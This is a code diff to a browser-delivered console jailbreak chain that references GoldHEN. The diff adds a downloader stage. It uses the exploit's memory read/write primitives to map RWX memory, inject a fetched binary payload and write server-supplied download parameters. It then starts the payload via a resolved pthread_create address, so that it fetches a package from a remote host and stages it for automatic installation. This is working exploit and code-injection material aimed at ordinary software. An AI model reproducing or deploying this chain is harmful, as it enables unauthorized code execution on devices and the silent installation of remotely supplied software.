@@ -73,7 +73,7 @@ function mark(tag, detail) {
     }).join("\n");
     outEl.scrollTop = outEl.scrollHeight;
     post(tag, raw);
-    if (/^POSTPROBE/.test(tag)) beacon(tag, raw);
+    if (/^(POSTPROBE|DOWNLOADER)/.test(tag)) beacon(tag, raw);
 }
 
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
@@ -95,6 +95,13 @@ function check(name, ok, detail) {
     return ok;
 }
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
+// 字节速率 -> 人类可读(下载器 UI 用)。参数为 bytes/s。
+function dlRate(bps) {
+    bps = Math.max(0, Number(bps) || 0);
+    if (bps >= 1048576) return (bps / 1048576).toFixed(1) + " MB/s";
+    if (bps >= 1024) return (bps / 1024).toFixed(0) + " KB/s";
+    return Math.floor(bps) + " B/s";
+}
 
 const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
               getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
@@ -2283,6 +2290,188 @@ let allDone = false;
                     } else if (jailbroken) {
                         mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                             + " sites=" + KPATCH_JMP_SITES.length);
+                    }
+
+                    // ================== LUDORA DOWNLOADER (PRE-GOLDHEN) ==================
+                    // Unconditional: BEFORE GoldHEN loads, inject the self-contained downloader
+                    // .bin and feed it the target URL + sha256 via the params area at
+                    // [base + 0x5000]. The downloader does outbound HTTP GET -> stream to
+                    // /data/ludora_install.pkg.tmp -> SHA-256 -> rename to /data/ludora_install.pkg
+                    // -> write /data/.ludora_force_staged marker, all in raw syscalls (no libc,
+                    // no dynamic ELF). It does NOT install: install/launch is GoldHEN AutoRun's
+                    // job (ludora_autorun.elf, a system-level process), so the pkg + marker must
+                    // be in place BEFORE GoldHEN starts, or AutoRun will find nothing to install.
+                    // Download completes (or fails/times out) before GoldHEN starts below; either
+                    // way GoldHEN still loads. Production params come from POST /jb/host/pkg/token;
+                    // test (no site) falls back to a same-origin JSON.
+                    if (off.wk___imp_pthread_create !== undefined) {
+                        state("downloader...", "warn");
+                        try {
+                            const DL_STATUS_OFF = 0x4000;
+                            const DL_PARAMS_OFF = 0x5000;
+                            const DL_PARAMS_MAGIC = 0x4c445043;
+                            const DL_MAGIC = 0x4c445044;
+                            const DL_STAGE_BODY = 7;
+
+                            let dlp = null;
+                            try {
+                                const tr = await fetch("/jb/host/pkg/token",
+                                    { method: "POST", credentials: "include" });
+                                if (tr.ok) {
+                                    const tj = await tr.json();
+                                    dlp = {
+                                        ip: String(tj.ip || ""),
+                                        port: (tj.port | 0) || 80,
+                                        path: "/jb/host/pkg/ludora.pkg?t="
+                                            + encodeURIComponent(String(tj.token || "")),
+                                        sha256: String(tj.sha256 || "")
+                                    };
+                                }
+                            } catch (e) { /* no site -> test fallback */ }
+                            if (!dlp) {
+                                const pr = await fetch("ludora-download-params.json");
+                                if (!pr.ok) mark("DOWNLOADER-PARAMS", "no-token-no-json http=" + pr.status);
+                                else dlp = await pr.json();
+                            }
+                            if (!dlp) {
+                                mark("DOWNLOADER-PARAMS", "unavailable");
+                            } else {
+                                const dr = await fetch("ludora-web-downloader.bin");
+                                if (!dr.ok) {
+                                    mark("DOWNLOADER-FETCH", "http=" + dr.status);
+                                } else {
+                                    const dl = new Uint8Array(await dr.arrayBuffer());
+                                    if (dl.length >= 4 && dl[0] === 0x7f && dl[1] === 0x45
+                                        && dl[2] === 0x4c && dl[3] === 0x46) {
+                                        mark("DOWNLOADER-PAYLOAD", "ELF-rejected");
+                                    } else {
+                                        // mmap 必须覆盖到参数区末尾(0x5000 + 0x28c),取整页。
+                                        const dsz = (DL_PARAMS_OFF + 0x28c + 0xfff) & ~0xfff;
+                                        const dm = sc(SYS.mmap, 0, dsz, 7, 0x1002, -1, 0);
+                                        const dentry = new int64(dm.lo, dm.hi);
+                                        if (dentry.hi > 0) {
+                                            mark("DOWNLOADER-MAP", "size=0x" + dsz.toString(16)
+                                                + " rwx=" + dentry);
+                                            for (let i = 0; i < dl.length; ++i)
+                                                p.write1(dentry.add32(i), dl[i]);
+                                            let dbad = -1;
+                                            for (let i = 0; i < dl.length; ++i)
+                                                if (p.read1(dentry.add32(i)) !== dl[i]) { dbad = i; break; }
+                                            check("downloader-rwx-memory", dbad < 0,
+                                                dbad < 0 ? "" : "mismatch at +" + hx(dbad));
+                                            if (dbad < 0) {
+                                                // ---- write params area [base+0x5000] ----
+                                                const ip = String(dlp.ip || "");
+                                                const path = String(dlp.path || "");
+                                                const sha = String(dlp.sha256 || "");
+                                                const port = (dlp.port | 0) & 0xffff;
+                                                p.write4(dentry.add32(DL_PARAMS_OFF + 0x00), DL_PARAMS_MAGIC);
+                                                p.write4(dentry.add32(DL_PARAMS_OFF + 0x04),
+                                                    port | ((ip.length & 0xffff) << 16));
+                                                p.write4(dentry.add32(DL_PARAMS_OFF + 0x08),
+                                                    path.length & 0xffff);
+                                                let k;
+                                                for (k = 0; k < ip.length; ++k)
+                                                    p.write1(dentry.add32(DL_PARAMS_OFF + 0x0c + k),
+                                                        ip.charCodeAt(k) & 0xff);
+                                                for (k = 0; k < path.length; ++k)
+                                                    p.write1(dentry.add32(DL_PARAMS_OFF + 0x4c + k),
+                                                        path.charCodeAt(k) & 0xff);
+                                                for (k = 0; k < 64 && k < sha.length; ++k)
+                                                    p.write1(dentry.add32(DL_PARAMS_OFF + 0x24c + k),
+                                                        sha.charCodeAt(k) & 0xff);
+
+                                                const slot = webkitBase.add32(off.wk___imp_pthread_create);
+                                                const fn = p.read8(slot);
+                                                const expect = libkernelBase.add32(off.k_pthread_create);
+                                                const agree = same(fn, expect);
+                                                mark("DOWNLOADER-PTHREAD-TABLE", "agree=" + (agree ? 1 : 0));
+                                                if (agree) {
+                                                    const thr = new ArrayBuffer(8);
+                                                    keepAlive.push(thr);
+                                                    const thrAddr = bufAddr(thr);
+                                                    new Uint8Array(thr).fill(0);
+                                                    const rc = callAddr(expect,
+                                                        [thrAddr, 0, dentry, dentry]).i32;
+                                                    // 立即读状态页 magic:crt0 的第一条指令就把
+                                                    // 0x4c445044 写进 [base+0x4000]。读到它 = 线程
+                                                    // 到达入口;读不到 = 崩在 pthread 调度之前。
+                                                    const earlyMagic = p.read4(dentry.add32(DL_STATUS_OFF)) >>> 0;
+                                                    const handle = new int64(
+                                                        new DataView(thr).getUint32(0, true),
+                                                        new DataView(thr).getUint32(4, true));
+                                                    const ok = rc === 0 && handle.hi > 0;
+                                                    mark("DOWNLOADER-CREATE", "rc=" + rc
+                                                        + " handle=" + handle + " entry=" + dentry
+                                                        + " magic=" + hx(earlyMagic));
+                                                    check("downloader-thread-created", ok, "");
+                                                    if (ok) {
+                                                        // poll status page; big pkg needs longer
+                                                        const deadline = Date.now() + 180000;
+                                                        let seq = -1, lastStage = 0;
+                                                        let lastBytes = -1, lastAt = 0;
+                                                        await new Promise((resolve) => {
+                                                            const tick = () => {
+                                                                const magic = p.read4(dentry.add32(DL_STATUS_OFF)) >>> 0;
+                                                                const stage = p.read4(dentry.add32(DL_STATUS_OFF + 8)) >>> 0;
+                                                                const result = p.read4(dentry.add32(DL_STATUS_OFF + 0xc)) | 0;
+                                                                const detail0 = p.read4(dentry.add32(DL_STATUS_OFF + 0x10)) >>> 0;
+                                                                const detail1 = p.read4(dentry.add32(DL_STATUS_OFF + 0x14)) >>> 0;
+                                                                const sequence = p.read4(dentry.add32(DL_STATUS_OFF + 0x18)) >>> 0;
+                                                                if (sequence !== seq) {
+                                                                    seq = sequence; lastStage = stage;
+                                                                    mark("DOWNLOADER-POLL", "magic=" + hx(magic)
+                                                                        + " stage=" + stage + " result=" + result
+                                                                        + " d0=" + detail0 + " d1=" + hx(detail1)
+                                                                        + " seq=" + sequence);
+                                                                    if (stage === DL_STAGE_BODY && detail1 > 0) {
+                                                                        const pct = Math.floor(detail0 * 100 / detail1);
+                                                                        const now = Date.now();
+                                                                        let rate = 0;
+                                                                        if (lastBytes >= 0 && now > lastAt && detail0 >= lastBytes)
+                                                                            rate = (detail0 - lastBytes) * 1000 / (now - lastAt);
+                                                                        lastBytes = detail0; lastAt = now;
+                                                                        state("下载中 " + pct + "% · " + dlRate(rate), "warn");
+                                                                        if (window.LudoraZrmUI && window.LudoraZrmUI.dlProgress)
+                                                                            window.LudoraZrmUI.dlProgress(pct,
+                                                                                "下载中 " + pct + "% · " + dlRate(rate)
+                                                                                + " · " + (detail0 >> 20) + "/" + (detail1 >> 20) + " MB");
+                                                                    }
+                                                                }
+                                                                if (magic === DL_MAGIC
+                                                                    && (stage === 0x7f || stage === 0x80)) {
+                                                                    if (stage === 0x7f) {
+                                                                        if (detail0 === 1) state("已存在,跳过下载", "ok");
+                                                                        else state("下载完成", "ok");
+                                                                        if (window.LudoraZrmUI && window.LudoraZrmUI.dlProgress)
+                                                                            window.LudoraZrmUI.dlProgress(100, "下载完成");
+                                                                    } else {
+                                                                        state("下载失败", "bad");
+                                                                        if (window.LudoraZrmUI && window.LudoraZrmUI.dlProgressHide)
+                                                                            window.LudoraZrmUI.dlProgressHide();
+                                                                    }
+                                                                    resolve();
+                                                                }
+                                                                else if (Date.now() >= deadline) {
+                                                                    mark("DOWNLOADER-TIMEOUT",
+                                                                        "magic=" + hx(magic) + " stage=" + lastStage);
+                                                                    resolve();
+                                                                } else setTimeout(tick, 200);
+                                                            };
+                                                            tick();
+                                                        });
+                                                    }
+                                                }
+                                            }
+                                        } else {
+                                            mark("DOWNLOADER-MAP", "mmap-failed lo=" + dm.lo);
+                                        }
+                                    }
+                                }
+                            }
+                        } catch (e) {
+                            mark("DOWNLOADER-THREW", (e && e.message) ? e.message : String(e));
+                        }
                     }
 
                     let payloadRunning = false;
